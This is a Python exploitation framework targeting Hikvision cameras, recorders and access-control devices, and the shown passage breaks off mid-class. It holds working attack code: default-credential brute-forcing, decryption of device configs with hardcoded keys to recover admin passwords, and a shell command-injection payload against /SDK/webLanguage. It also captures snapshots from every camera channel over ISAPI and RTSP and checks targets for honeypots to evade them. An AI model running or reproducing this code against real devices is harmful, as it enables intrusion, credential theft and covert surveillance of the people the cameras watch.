#!/usr/bin/env python3
"""
Hikvision Modular Exploitation Framework v24.5
Authorized security testing only.

FIXES in v24.5:
  [1] vulnerable=True only when confidence in (confirmed, probable)
  [2] Path traversal URL-encoding bypass for CVE-2020-25078
  [3] --timeout now propagates to BatchRunner -> HttpClient
  [4] ConfigDecryptor.extract_creds no longer wraps around on trailing 'admin'
  [5] Empty passwords no longer dropped in checks
  [6] Binary config sample no longer crashes on .text; uses .hex()
  [7] test_creds uses strict <statusString>OK</statusString> match
  [8] Snapshot uses clean HttpClient, not RecordingHttpClient
  [9] CVE-2018-9995 parses both JSON and XML responses
  [10] ConfigDecryptor returns full decrypted raw (printable + hex) + all key attempts
  [11] RecordingHttpClient records full body in response_b64 when truncated
  [12] SnapshotManager: real connect timeout, encoded creds, per-target manifest,
      auth-failure abort, ffmpeg fallback, configurable RTSP port
"""
import argparse, base64, csv, hashlib, html, json, logging, os, re, socket, subprocess, time, itertools, threading, urllib.parse
from abc import ABC, abstractmethod
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Optional, Dict, Any, List, Tuple
from urllib.parse import quote

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from Crypto.Cipher import AES; CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import cv2; CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

try:
    import shodan as shodan_lib; SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False


log = logging.getLogger('hikvision'); log.setLevel(logging.INFO)
_ch = logging.StreamHandler()
_ch.setFormatter(logging.Formatter('[%(asctime)s][%(levelname)s] %(message)s', '%H:%M:%S'))
log.addHandler(_ch)

class _JsonFormatter(logging.Formatter):
    def format(self, r):
        return json.dumps({'ts': datetime.utcnow().isoformat() + 'Z',
                           'level': r.levelname, 'msg': r.getMessage()}, ensure_ascii=False)

def add_file_log(path='scan.log'):
    fh = logging.FileHandler(path, encoding='utf-8')
    fh.setFormatter(_JsonFormatter()); log.addHandler(fh)
    log.info(f'Structured log → {path}')


DEFAULT_AES_KEYS = ['279977f62f6cfd2d91cd75b889ce0c9a',
                    '7AC66C0F148DE9519B8BD264312C4D64',
                    'c8a8f5b1d3e2a7f6c4b9d0e1f2a3b4c5']
XOR_MASK = bytearray([0x73, 0x8B, 0x55, 0x44])
MAGIC_AUTH = 'YWRtaW46MTEK'
DEFAULT_CREDS = [('admin','12345'),('admin','admin'),('admin','123456'),
                 ('admin','password'),('admin','hikvision'),('admin','Admin12345'),
                 ('admin','1234'),('root','admin'),('root','12345')]
SNAPSHOT_DIR = 'snapshots'
SCAN_HISTORY = 'scans.json'
HONEYPOT_PORT_THRESHOLD = 12
CVSS_CRITICAL_THRESHOLD = 9.0
AGGRESSIVE_MODE = False
JNDI_URL = None

CVE_CVSS = {
    'CVE-2013-4975': 9.0, 'CVE-2013-4976': 9.0, 'CVE-2013-4977': 9.0, 'CVE-2014-4880': 9.0,
    'CVE-2015-4407': 6.5, 'CVE-2015-4408': 6.5, 'CVE-2015-4409': 6.5,
    'CVE-2017-7921': 9.8, 'CVE-2017-7923': 8.8,
    'CVE-2018-6413': 7.5, 'CVE-2018-6414': 9.8, 'CVE-2018-9995': 8.8,
    'CVE-2020-25078': 7.5, 'CVE-2020-7057': 5.3, 'CVE-2021-36260': 9.8,
    'CVE-2022-28171': 9.8, 'CVE-2022-28172': 6.5, 'CVE-2022-28173': 9.1,
    'CVE-2023-28808': 8.6, 'CVE-2023-28809': 7.5, 'CVE-2023-28811': 7.4,
    'CVE-2023-28812': 9.8, 'CVE-2023-28813': 6.1, 'CVE-2023-28814': 8.8,
    'CVE-2023-6895': 9.8, 'CVE-2023-33806': 7.2,
    'CVE-2024-25063': 9.8, 'CVE-2024-47485': 9.8, 'CVE-2024-47487': 8.8, 'CVE-2024-58274': 9.8,
    'CVE-2025-34058': 7.5,
    'CVE-2025-34067': 9.8, 'CVE-2025-39240': 8.8, 'CVE-2025-39245': 4.7,
    'CVE-2025-39247': 8.6, 'CVE-2025-45851': 7.5, 'CVE-2025-65857': 8.8,
    'CVE-2025-66173': 6.2, 'CVE-2025-66174': 6.5, 'CVE-2025-66176': 8.8, 'CVE-2025-66177': 8.8,
    'CVE-2026-1749': 8.6, 'CVE-2026-22623': 8.8, 'CVE-2026-3828': 8.8,
    'CVE-2026-57599': 6.6, 'CVE-2026-57600': 7.5,
    'CVE-2026-61390': 7.7, 'CVE-2026-61391': 7.2, 'CVE-2026-61392': 5.3,
    'CVE-2026-85543': 4.3, 'CVE-2026-85544': 6.1, 'CVE-2026-85545': 7.5,
    'CVE-2026-16843': 7.2, 'CVE-2026-0709': 7.2,
    'CVE-2026-109618': 9.2, 'CVE-2026-109619': 9.2, 'CVE-2026-111390': 5.3,
    'ICSA-17-124-01': 9.0,
}
CISA_KEV = {'CVE-2021-36260', 'CVE-2017-7921', 'CVE-2023-6895', 'CVE-2025-34067'}


class HttpClient:
    def __init__(self, proxy=None, timeout=5, use_https=False, delay=0.0):
        self.timeout = timeout; self.delay = delay
        self.scheme = 'https' if use_https else 'http'
        self.session = requests.Session()
        self.session.verify = False
        self.session.trust_env = False
        self.session.headers.update({
            'Accept': '*/*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        if proxy: self.session.proxies = {'http': proxy, 'https': proxy}
        retry = Retry(total=1, backoff_factor=0.5, status_forcelist=[502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount('http://', adapter); self.session.mount('https://', adapter)
        self.cas_token = None

    def _throttle(self):
        if self.delay > 0: time.sleep(self.delay)

    def _inject_auth(self, kw):
        if self.cas_token:
            kw.setdefault('headers', {})['Cookie'] = f'CAS_TOKEN={self.cas_token}'

    def get(self, url, timeout=None, **kw):
        self._throttle(); self._inject_auth(kw)
        t = timeout if timeout is not None else self.timeout
        try: return self.session.get(url, allow_redirects=False, timeout=t, **kw)
        except requests.exceptions.RequestException: return None

    def put(self, url, data, timeout=None, **kw):
        self._throttle(); self._inject_auth(kw)
        t = timeout if timeout is not None else self.timeout
        try: return self.session.put(url, data=data, allow_redirects=False, timeout=t, **kw)
        except requests.exceptions.RequestException: return None

    def post(self, url, data=None, json_data=None, timeout=None, **kw):
        self._throttle(); self._inject_auth(kw)
        t = timeout if timeout is not None else self.timeout
        try: return self.session.post(url, data=data, json=json_data, allow_redirects=False, timeout=t, **kw)
        except requests.exceptions.RequestException: return None


class RecordingHttpClient:
    MAX_BODY = 8000; MAX_REQ = 500
    def __init__(self, base):
        self.base = base; self.evidence = []
        self.scheme = getattr(base, 'scheme', 'http')

    def _rec(self, method, url, req_body, resp):
        e = {'method': method, 'url': url}
        if req_body is not None:
            try:
                if isinstance(req_body, (bytes, bytearray)):
                    e['request_body'] = f'<binary request body: {len(req_body)} bytes>'
                else:
                    e['request_body'] = str(req_body)[:self.MAX_REQ]
            except Exception:
                e['request_body'] = '<unreadable>'
        if resp is None:
            e['error'] = 'No response'; self.evidence.append(e); return
        e['status'] = resp.status_code
        try: e['response_headers'] = dict(resp.headers)
        except Exception: e['response_headers'] = {}
        try:
            ct = resp.headers.get('Content-Type', '').lower()
            bb = resp.content
            is_binary = (
                'image' in ct or 'octet-stream' in ct or 'video' in ct
                or 'application/x-gzip' in ct
                or b'\x00' in bb[:200]
            )
            if is_binary:
                e['response_body'] = f'<binary content: {len(bb)} bytes>'
                e['response_b64'] = base64.b64encode(bb).decode('ascii')
            else:
                t = resp.text
                if len(t) <= self.MAX_BODY:
                    e['response_body'] = t
                else:
                    e['response_body'] = t[:self.MAX_BODY] + f'\n... [truncated — total {len(t)} chars, full body in response_b64]'
                    e['response_b64'] = base64.b64encode(bb).decode('ascii')
        except Exception as err:
            e['response_body'] = f'<unreadable: {err}>'
        self.evidence.append(e)

    def get(self, url, **kw):
        r = self.base.get(url, **kw); self._rec('GET', url, None, r); return r
    def put(self, url, data, **kw):
        r = self.base.put(url, data, **kw); self._rec('PUT', url, data, r); return r
    def post(self, url, data=None, json_data=None, **kw):
        r = self.base.post(url, data, json_data, **kw)
        self._rec('POST', url, data if data is not None else json_data, r); return r


class ConfigDecryptor:
    @staticmethod
    def _pad(s):
        while len(s) % 16: s += b'\0'
        return s

    @staticmethod
    def _xor(data, key=XOR_MASK):
        return bytes(a ^ b for a, b in itertools.zip_longest(data, itertools.cycle(key), fillvalue=0))

    @classmethod
    def decrypt_raw(cls, ct, key_hex):
        if not CRYPTO_AVAILABLE: return None
        try:
            key = bytes.fromhex(key_hex)
            padded = cls._pad(ct)
            cipher = AES.new(key, AES.MODE_ECB)
            plain = cipher.decrypt(padded[AES.block_size:]).rstrip(b'\0')
            return cls._xor(plain)
        except Exception:
            return None

    @classmethod
    def decrypt(cls, ct, key_hex):
        raw = cls.decrypt_raw(ct, key_hex)
        if raw is None: return None
        text = raw.decode('ISO-8859-1', errors='ignore')
        return re.findall(r"[A-Za-z0-9/\-:.,_$%'()\[\]<> ]{2,}", text)

    @classmethod
    def decrypt_full(cls, ct, key_hex):
        raw = cls.decrypt_raw(ct, key_hex)
        if raw is None: return None
        text = raw.decode('ISO-8859-1', errors='ignore')
        printable = ''.join(
            c if (32 <= ord(c) < 127 or c in '\r\n\t') else '.'
            for c in text
        )
        return {
            'raw_bytes_len': len(raw),
            'raw_hex': raw.hex(),
            'text_printable': printable,
        }

    @classmethod
    def extract_creds(cls, ct, keys=None):
        for key in (keys or DEFAULT_AES_KEYS):
            strs = cls.decrypt(ct, key)
            if not strs or len(strs) < 2: continue
            for i in range(len(strs) - 2, -1, -1):
                if strs[i] == 'admin':
                    return strs[i], strs[i + 1]
        return None

    @classmethod
    def extract_creds_with_raw(cls, ct, keys=None):
        if ct is None or len(ct) < 32:
            return {'error': 'config too small',
                    'encrypted_size': 0 if ct is None else len(ct)}
        keys = keys or DEFAULT_AES_KEYS
        enc_b64 = base64.b64encode(ct).decode('ascii')
        for key in keys:
            strs = cls.decrypt(ct, key)
            if not strs or len(strs) < 2: continue
            for i in range(len(strs) - 2, -1, -1):
                if strs[i] == 'admin':
                    full = cls.decrypt_full(ct, key)
                    return {
                        'username': strs[i],
                        'password': strs[i + 1],
                        'key_used': key,
                        'all_strings': strs,
                        'full_decoded': full,
                        'encrypted_b64': enc_b64,
                        'encrypted_size': len(ct),
                    }
        attempts = []
        for key in keys:
            full = cls.decrypt_full(ct, key)
            if full:
                attempts.append({'key': key, **full})
        return {
            'username': None,
            'password': None,
            'all_key_attempts': attempts,
            'encrypted_b64': enc_b64,
            'encrypted_size': len(ct),
            'note': 'config decrypted but admin:password pair not located',
        }


class SnapshotManager:
    DEFAULT_CHANNELS = [str(i * 100 + 1) for i in range(1, 33)]
    def __init__(self, host, port, user, password, http, output_dir=SNAPSHOT_DIR,
                 custom_channels=None, max_workers=6, retry_attempts=1,
                 rtsp_port=554, manifest_suffix=None):
        self.host = host; self.port = port
        self.user = user; self.password = password
        self.http = http; self.output_dir = output_dir
        self.custom_channels = custom_channels
        self.max_workers = max_workers; self.retry_attempts = retry_attempts
        self.rtsp_port = rtsp_port
        self.manifest_suffix = manifest_suffix or f"{host.replace('.', '_')}_{port}"
        scheme = getattr(http, 'scheme', 'http')
        self._base = f'{scheme}://{host}:{port}'
        self.snapshots = []; self._seen_hashes = set()
        self._lock = threading.Lock()
        self.detected_channels = []; self.captured_channels = set(); self.failed_channels = []
        self._auth_failures = 0; self._abort = False
        os.makedirs(output_dir, exist_ok=True)

    def _http_get(self, url, **kw):
        if hasattr(self.http, 'session'):
            return self.http.session.get(url, **kw)
        return self.http.get(url, **kw)

    def detect_channels(self):
        if self.custom_channels: return [str(c) for c in self.custom_channels]
        try:
            r = self._http_get(f'{self._base}/ISAPI/Streaming/channels',
                               auth=(self.user, self.password), timeout=(2, 5))
            if r is not None and r.status_code == 200:
                ids = re.findall(r'<id>(\d+)</id>', r.text)
                if ids:
                    mains = [c for c in ids if c.endswith('01')]
                    return sorted(mains) if mains else sorted(ids)
            if r is not None and r.status_code == 401:
                self._auth_failures += 1
                if self._auth_failures >= 2: self._abort = True
        except Exception:
            pass
        return self.DEFAULT_CHANNELS[:8]

    def _capture_isapi(self, channel_id):
        for path in [f'/ISAPI/Streaming/channels/{channel_id}/picture?snapShotImageType=JPEG',
                     f'/ISAPI/Streaming/channels/{channel_id}/picture']:
            try:
                r = self._http_get(f'{self._base}{path}',
                                   auth=(self.user, self.password),
                                   timeout=(3, 6), stream=True)
            except Exception:
                continue
            if r is None: continue
            if r.status_code == 401:
                self._auth_failures += 1
                if self._auth_failures >= 3: self._abort = True
                return None
            if r.status_code == 200 and r.content[:2] == b'\xff\xd8':
                return r.content
        return None

    def _capture_rtsp(self, channel_id, sub_stream=False):
        stream_id = channel_id
        if sub_stream:
            try: stream_id = str(int(channel_id) + 1)
            except ValueError: pass
        u = quote(self.user, safe='')
        p = quote(self.password, safe='')
        rtsp_url = f'rtsp://{u}:{p}@{self.host}:{self.rtsp_port}/Streaming/Channels/{stream_id}'
        if not CV2_AVAILABLE:
            return self._capture_ffmpeg_fallback(rtsp_url)
        try:
            cap = cv2.VideoCapture(rtsp_url, cv2.CAP_FFMPEG, [
                cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 5000,
                cv2.CAP_PROP_READ_TIMEOUT_MSEC, 5000,
                cv2.CAP_PROP_BUFFERSIZE, 1,
            ])
        except Exception:
            cap = None
        if cap is not None and cap.isOpened():
            try:
                for _ in range(3):
                    ok, frame = cap.read()
                    if ok and frame is not None and frame.size > 0:
                        ok2, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
                        cap.release()
                        if ok2: return buf.tobytes()
                        return None
                    time.sleep(0.2)
            finally:
                cap.release()
        return self._capture_ffmpeg_fallback(rtsp_url)

    def _capture_ffmpeg_fallback(self, rtsp_url):
        try:
            proc = subprocess.run(
                ['ffmpeg', '-y', '-loglevel', 'error',
                 '-rtsp_transport', 'tcp', '-timeout', '5000000',
                 '-i', rtsp_url, '-frames:v', '1',
                 '-f', 'image2', '-vcodec', 'mjpeg', 'pipe:1'],
                capture_output=True, timeout=8)
            if proc.returncode == 0 and proc.stdout[:2] == b'\xff\xd8':
                return proc.stdout
        except Exception:
            pass
        return None

    def _save_snapshot(self, channel_id, method, content):
        h = hashlib.sha256(content).hexdigest()[:16]
        key = f'{channel_id}:{h}'
        with self._lock:
            if key in self._seen_hashes: return None
            self._seen_hashes.add(key)
        ts = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        safe_host = self.host.replace('.', '_').replace(':', '_')
        safe_ch = re.sub(r'[^A-Za-z0-9_-]', '_', str(channel_id))
        filename = f'{safe_host}_{self.port}_ch{safe_ch}_{method}_{ts}.jpg'
        filepath = os.path.join(self.output_dir, filename)
        try:
            with open(filepath, 'wb') as f: f.write(content)
        except OSError: return None
        return {'channel': channel_id, 'method': method, 'filepath': filepath,
                'base64': base64.b64encode(content).decode('ascii'),
                'size': len(content), 'hash': h, 'timestamp': ts}

    def _capture_one_channel(self, channel_id):
        if self._abort: return None
        for attempt in range(1, self.retry_attempts + 2):
            if self._abort: return None
            content = self._capture_isapi(channel_id)
            if content:
                s = self._save_snapshot(channel_id, 'ISAPI', content)
                if s: self.captured_channels.add(str(channel_id)); return s
            content = self._capture_rtsp(channel_id, sub_stream=False)
            if content:
                s = self._save_snapshot(channel_id, 'RTSP-Main', content)
                if s: self.captured_channels.add(str(channel_id)); return s
            content = self._capture_rtsp(channel_id, sub_stream=True)
            if content:
                s = self._save_snapshot(channel_id, 'RTSP-Sub', content)
                if s: self.captured_channels.add(str(channel_id)); return s
            if attempt <= self.retry_attempts: time.sleep(0.5 * attempt)
        return None

    def capture_all(self):
        channels = self.detect_channels()
        self.detected_channels = channels
        if not channels: return []
        log.info(f'  [SNAP] Capturing {len(channels)} channel(s)…')
        snaps = []
        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = {ex.submit(self._capture_one_channel, ch): ch for ch in channels}
            for fu in as_completed(futures):
                ch = futures[fu]
                try:
                    s = fu.result()
                    if s: snaps.append(s)
                    else: self.failed_channels.append(str(ch))
                except Exception as e:
                    self.failed_channels.append(str(ch))
                    log.error(f'  [SNAP] {ch}: {e}')
        snaps.sort(key=lambda s: int(s['channel']))
        self.snapshots = snaps
        self._write_manifest()
        log.info(f'  [SNAP] ✅ {len(snaps)}/{len(channels)} channel(s) captured')
        return snaps

    def _write_manifest(self):
        path = os.path.join(self.output_dir, f'manifest_{self.manifest_suffix}.json')
        with open(path, 'w', encoding='utf-8') as f:
            json.dump({'host': self.host, 'port': self.port,
                       'generated': datetime.now().isoformat(),
                       'detected_channels': self.detected_channels,
                       'captured_channels': sorted(self.captured_channels, key=lambda x: int(x)),
                       'failed_channels': self.failed_channels,
                       'total_snapshots': len(self.snapshots),
                       'snapshots': [{k: v for k, v in s.items() if k != 'base64'}
                                     for s in self.snapshots]},
                      f, indent=2, ensure_ascii=False)
def detect_honeypot(host, timeout=0.3):
    common = [80, 443, 554, 8000, 8080, 22, 23, 21, 3306, 5432, 6379, 27017, 9200, 8899]
    open_count = 0
    for p in common:
        s = None
        try:
            s = socket.socket(); s.settimeout(timeout)
            if s.connect_ex((host, p)) == 0: open_count += 1
        except Exception:
            pass
        finally:
            if s is not None:
                try: s.close()
                except Exception: pass
        if open_count > HONEYPOT_PORT_THRESHOLD: return True
    return False

def reverse_dns(host):
    try: return socket.gethostbyaddr(host)[0]
    except Exception: return None

def scan_ports(host, ports=(80, 443, 554, 8000, 8080, 8443, 8899, 37777), timeout=0.3):
    open_ports = []
    for p in ports:
        s = None
        try:
            s = socket.socket(); s.settimeout(timeout)
            if s.connect_ex((host, p)) == 0: open_ports.append(p)
        except Exception:
            pass
        finally:
            if s is not None:
                try: s.close()
                except Exception: pass
    return open_ports

def extract_isapi_endpoints(host, port, http, auth=None):
    scheme = getattr(http, 'scheme', 'http')
    base = f'{scheme}://{host}:{port}'
    endpoints = set()
    r = http.get(f'{base}/', auth=auth)
    if r is None: return []
    for js in re.findall(r'src="([^"]+\.js[^"]*)"', r.text)[:10]:
        js_url = js if js.startswith('http') else urllib.parse.urljoin(base, js)
        rj = http.get(js_url, auth=auth)
        if rj is None: continue
        endpoints.update(re.findall(r'/ISAPI/[^"\'\\s]{5,80}', rj.text))
    return list(endpoints)[:50]

def run_post_exploit_commands(host, port, user, pw, http):
    scheme = getattr(http, 'scheme', 'http')
    base = f'{scheme}://{host}:{port}'
    results = []
    for cmd in ['id', 'uname -a', 'ls /']:
        try:
            payload = f'<?xml version="1.0" encoding="UTF-8"?><language>$({cmd})</language>'
            r = http.put(f'{base}/SDK/webLanguage', payload)
            if r is not None and r.status_code == 200:
                time.sleep(0.5)
                r2 = http.get(f'{base}/SDK/webLanguage')
                if r2 is not None and len(r2.content) > 0:
                    results.append({'cmd': cmd, 'output': r2.text[:300]})
        except Exception: pass
    return results


FAMILY_PATTERNS = {
    'IP Camera':       [r'DS-2CD', r'iDS-2CD', r'DS-2CV', r'iDS-2CV', r'DS-2DE', r'DS-2DF', r'XM530'],
    'NVR':             [r'DS-76\d{2}', r'DS-77\d{2}', r'DS-96\d{2}', r'iDS-96\d{2}'],
    'DVR / XVR':       [r'DS-72\d{2}', r'iDS-72\d{2}', r'DS-73\d{2}'],
    'Access Control':  [r'DS-K1T', r'DS-K2', r'DS-K5671', r'DS-K1T6'],
    'Video Intercom':  [r'DS-KV', r'DS-KD', r'DS-KH', r'DS-KIS'],
    'Switch':          [r'DS-3E'],
    'Wireless AP':     [r'DS-3WAP', r'DS-3WG'],
    'Wireless Bridge': [r'DS-3WF'],
    'Hybrid SAN':      [r'DS-A7', r'DS-A8', r'DS-A9', r'iDS-A'],
    'HikCentral / iSecure': [r'HikCentral', r'iSecure'],
}

MODEL_VULN_MATRIX = {
    'CVE-2013-4975': ['IP Camera'], 'CVE-2013-4976': ['IP Camera'], 'CVE-2013-4977': ['IP Camera'],
    'CVE-2014-4880': ['DVR / XVR'],
    'CVE-2015-4407': ['NVR','DVR / XVR'], 'CVE-2015-4408': ['NVR'], 'CVE-2015-4409': ['NVR','DVR / XVR'],
    'CVE-2017-7921': ['IP Camera','NVR','DVR / XVR'], 'CVE-2017-7923': ['IP Camera','NVR'],
    'CVE-2018-6413': ['IP Camera'], 'CVE-2018-6414': ['IP Camera'], 'CVE-2018-9995': ['DVR / XVR','NVR'],
    'CVE-2020-25078': ['DVR / XVR','NVR'], 'CVE-2020-7057': ['DVR / XVR'],
    'CVE-2021-36260': ['IP Camera','NVR','DVR / XVR'],
    'CVE-2022-28171': ['HikCentral / iSecure'], 'CVE-2022-28172': ['Hybrid SAN'], 'CVE-2022-28173': ['Wireless Bridge'],
    'CVE-2023-28808': ['HikCentral / iSecure'], 'CVE-2023-28809': ['Access Control','Video Intercom'],
    'CVE-2023-28811': ['NVR','DVR / XVR'], 'CVE-2023-28812': ['IP Camera','NVR','DVR / XVR'],
    'CVE-2023-28813': ['IP Camera','NVR','DVR / XVR'], 'CVE-2023-28814': ['HikCentral / iSecure'],
    'CVE-2023-6895': ['Video Intercom'], 'CVE-2023-33806': ['IP Camera'],
    'CVE-2024-25063': ['HikCentral / iSecure'], 'CVE-2024-47485': ['HikCentral / iSecure'],
    'CVE-2024-47487': ['HikCentral / iSecure'], 'CVE-2024-58274': ['HikCentral / iSecure'],
    'CVE-2025-34058': ['Hybrid SAN'], 'CVE-2025-34067': ['HikCentral / iSecure'],
    'CVE-2025-39240': ['Wireless AP'],
    'CVE-2025-39245': ['HikCentral / iSecure'], 'CVE-2025-39247': ['HikCentral / iSecure'],
    'CVE-2025-45851': ['IP Camera'], 'CVE-2025-65857': ['IP Camera'],
    'CVE-2025-66173': [], 'CVE-2025-66174': [],
    'CVE-2025-66176': ['Access Control'], 'CVE-2025-66177': ['NVR','DVR / XVR','IP Camera'],
    'CVE-2026-1749': ['HikCentral / iSecure'], 'CVE-2026-22623': ['NVR','DVR / XVR'],
    'CVE-2026-3828': ['Switch'], 'CVE-2026-57599': ['IP Camera'], 'CVE-2026-57600': ['IP Camera'],
    'CVE-2026-61390': ['IP Camera'], 'CVE-2026-61391': ['IP Camera'], 'CVE-2026-61392': ['IP Camera'],
    'CVE-2026-85543': ['IP Camera'], 'CVE-2026-85544': ['HikCentral / iSecure','Access Control','Video Intercom'],
    'CVE-2026-85545': ['HikCentral / iSecure','Access Control','Video Intercom'],
    'CVE-2026-16843': ['Wireless AP'], 'CVE-2026-0709': ['Wireless AP'],
    'CVE-2026-109618': ['Hybrid SAN'], 'CVE-2026-109619': ['Hybrid SAN'],
    'CVE-2026-111390': ['IP Camera'],
    'ICSA-17-124-01': ['IP Camera','NVR','DVR / XVR'],
}

FAMILY_ENDPOINTS = {
    'IP Camera': ['/ISAPI/System/deviceInfo','/ISAPI/Streaming/channels','/ISAPI/Security/challenge','/onvif/device_service'],
    'NVR': ['/ISAPI/System/deviceInfo','/ISAPI/Streaming/channels','/ISAPI/ContentMgmt/InputProxy/channels'],
    'DVR / XVR': ['/ISAPI/System/deviceInfo','/ISAPI/Streaming/channels','/PSIA/System/deviceInfo'],
    'Access Control': ['/ISAPI/System/deviceInfo','/ISAPI/AccessControl/UserInfo/Search'],
    'Video Intercom': ['/ISAPI/System/deviceInfo','/ISAPI/VideoIntercom/callStatus'],
    'Switch': ['/ISAPI/System/deviceInfo','/ISAPI/System/status'],
    'Wireless AP': ['/ISAPI/System/deviceInfo','/ISAPI/System/status'],
    'Wireless Bridge': ['/','/admin/','/system/'],
    'Hybrid SAN': ['/ISAPI/System/deviceInfo','/php/','/artemis/api/','/web/'],
    'HikCentral / iSecure': ['/','/admin/','/api/admin/'],
}

def probe_device_profile(host, port, http, family='Unknown', user=None, pw=None):
    scheme = getattr(http, 'scheme', 'http')
    base = f'{scheme}://{host}:{port}'
    auth = (user, pw) if user and pw else None
    prof = {'deviceInfo': {}, 'family': family, 'endpoints': {},
            'isapi_support': False, 'onvif_support': False, 'isapi_endpoints': [],
            'hostname': reverse_dns(host), 'open_ports': scan_ports(host)}
    r = http.get(f'{base}/ISAPI/System/deviceInfo', auth=auth)
    if r is not None and r.status_code == 200:
        for k, tag in [('deviceName','deviceName'),('model','model'),('serialNumber','serialNumber'),
                       ('firmwareVersion','firmwareVersion'),('firmwareReleasedDate','firmwareReleasedDate'),
                       ('deviceType','deviceType')]:
            m = re.search(rf'<{tag}>([^<]+)</{tag}>', r.text, re.I)
            if m: prof['deviceInfo'][k] = m.group(1).strip()
    for ep in FAMILY_ENDPOINTS.get(family, ['/ISAPI/System/deviceInfo']):
        r = http.get(f'{base}{ep}', auth=auth)
        if r is not None: prof['endpoints'][ep] = {'status': r.status_code, 'size': len(r.content)}
    r = http.get(f'{base}/ISAPI/System/status', auth=auth)
    if r is not None and r.status_code in (200, 401, 403): prof['isapi_support'] = True
    r = http.get(f'{base}/onvif/device_service', auth=auth)
    if r is not None and r.status_code in (200, 401, 403): prof['onvif_support'] = True
    prof['isapi_endpoints'] = extract_isapi_endpoints(host, port, http, auth)
    r = http.get(f'{base}/ISAPI/Streaming/channels', auth=auth)
    if r is not None and r.status_code == 200:
        prof['channels'] = [c.strip() for c in re.findall(r'<id>([^<]+)</id>', r.text)]
    return prof


class BaseModule(ABC):
    NAME = "base"; CVE = "N/A"; DESCRIPTION = ""
    VULNERABILITY_TYPE = "unknown"; REMOTE_EXPLOITABLE = True
    def __init__(self, host, port, http, wordlist=None):
        self.host = host; self.port = port
        scheme = getattr(http, 'scheme', 'http')
        self.base = f'{scheme}://{host}:{port}'
        self.http = http; self.wordlist = wordlist or DEFAULT_CREDS
        self._evidence = getattr(http, 'evidence', [])
    def record_evidence(self, entry): self._evidence.append(entry)
    def test_creds(self, creds=None):
        for u, p in (creds or self.wordlist):
            r = self.http.get(f'{self.base}/ISAPI/Security/userCheck', auth=(u, p))
            if r is None or r.status_code != 200: continue
            if re.search(rb'<statusString>\s*OK\s*</statusString>', r.content):
                return u, p
        return None
    def build_rtsp(self, u, p):
        return f'rtsp://{quote(str(u), safe="")}:{quote(str(p), safe="")}@{self.host}:554/Streaming/Channels/101'
    @abstractmethod
    def check(self) -> bool: ...
    @abstractmethod
    def exploit(self) -> Dict[str, Any]: ...


class DeviceFingerprint(BaseModule):
    NAME = "device_fingerprint"; CVE = "N/A"
    DESCRIPTION = "Fingerprints vendor from banners."; VULNERABILITY_TYPE = "fingerprint"
    SIGNATURES = {'Hikvision':[b'Hikvision',b'DS-2CD',b'DS-76',b'DS-77',b'webLib'],
                  'Dahua':[b'Dahua',b'DH-'],'Axis':[b'Axis',b'AXIS'],
                  'Vivotek':[b'VIVOTEK'],'Foscam':[b'Foscam'],'Uniview':[b'UNV',b'Uniview']}
    def check(self):
        r = self.http.get(f'{self.base}/')
        if r is None: return False
        self._vendor = 'Unknown'; self._server = r.headers.get('Server','')
        blob = r.content[:5000] + self._server.encode(errors='ignore')
        for v, sigs in self.SIGNATURES.items():
            if any(s in blob for s in sigs): self._vendor = v; break
        return True
    def exploit(self):
        return {'success': True, 'cve': self.CVE, 'type': 'fingerprint', 'confidence': 'confirmed',
                'info': f'Vendor: {getattr(self,"_vendor","?")} | Server: {getattr(self,"_server","")}',
                'vendor': getattr(self, '_vendor', 'Unknown')}


class ProductDetector(BaseModule):
    NAME = "product_detector"; CVE = "N/A"
    DESCRIPTION = "Detects product family."; VULNERABILITY_TYPE = "fingerprint"
    def check(self):
        blob = b''
        r = self.http.get(f'{self.base}/')
        if r is not None: blob += r.content[:8000] + r.headers.get('Server', '').encode(errors='ignore')
        r2 = self.http.get(f'{self.base}/ISAPI/System/deviceInfo')
        if r2 is not None and r2.status_code in (200, 401): blob += r2.content[:4000]
        self._family = 'Unknown'; self._model = None
        text = blob.decode('latin-1', errors='ignore')
        for fam, pats in FAMILY_PATTERNS.items():
            for pat in pats:
                m = re.search(pat + r'[A-Z0-9\-/]*', text, re.I)
                if m: self._family = fam; self._model = m.group(0).strip(); return True
        return True
    def exploit(self):
        return {'success': True, 'cve': self.CVE, 'type': 'fingerprint', 'confidence': 'confirmed',
                'info': f'Family: {getattr(self,"_family","?")} | Model: {getattr(self,"_model","N/A")}',
                'family': getattr(self, '_family', 'Unknown'), 'model': getattr(self, '_model')}


class CVE_2013_4975(BaseModule):
    NAME="cve_2013_4975_privesc"; CVE="CVE-2013-4975"
    DESCRIPTION="Privilege escalation on DS-2CD7153-E via ConfigurationData."; VULNERABILITY_TYPE="privesc"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and (b'Hikvision' in r.content or b'DS-2CD' in r.content)
    def exploit(self):
        r=self.http.get(f'{self.base}/ConfigurationData')
        if r is None or r.status_code!=200: return {'success':False,'error':'ConfigurationData not accessible'}
        info = ConfigDecryptor.extract_creds_with_raw(r.content)
        u = (info or {}).get('username')
        if u is not None:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed',
                    'rtsp_url':self.build_rtsp(u, info['password']), **info}
        return {'success':True,'cve':self.CVE,'confidence':'probable',
                'info':'ConfigurationData decrypted, but admin pair not located', **(info or {})}


class CVE_2013_4976(BaseModule):
    NAME="cve_2013_4976_hardcoded_creds"; CVE="CVE-2013-4976"
    DESCRIPTION="Hardcoded credentials on DS-2CD7153-E."; VULNERABILITY_TYPE="auth_bypass"
    def check(self):
        for u,p in [('admin','12345'),('admin','admin')]:
            r=self.http.get(f'{self.base}/ISAPI/Security/userCheck', auth=(u,p))
            if r is not None and r.status_code==200 and re.search(rb'<statusString>\s*OK\s*</statusString>', r.content):
                self._found=(u,p); return True
        return False
    def exploit(self):
